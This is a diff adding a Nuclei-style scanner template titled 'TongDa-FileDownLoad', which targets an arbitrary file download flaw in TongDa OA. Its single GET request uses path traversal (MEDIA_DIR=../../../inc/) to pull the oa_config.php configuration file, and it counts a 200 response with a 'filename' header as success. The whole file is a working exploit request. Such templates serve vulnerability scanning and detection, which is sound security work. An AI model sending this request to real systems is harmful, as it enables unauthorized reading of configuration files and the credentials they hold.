@@ -1,0 +1,24 @@
+id: TongDa-FileDownLoad
+
+info:
+  name: TongDa-FileDownLoad
+  author: wintrysec
+  severity: critical
+  description: 通达OA任意文件下载
+  reference: https://github.com/DawnFlame/POChouse
+  tags: TongDa
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "filename"
+        condition: and
+      - type: status
+        status:
+          - 200
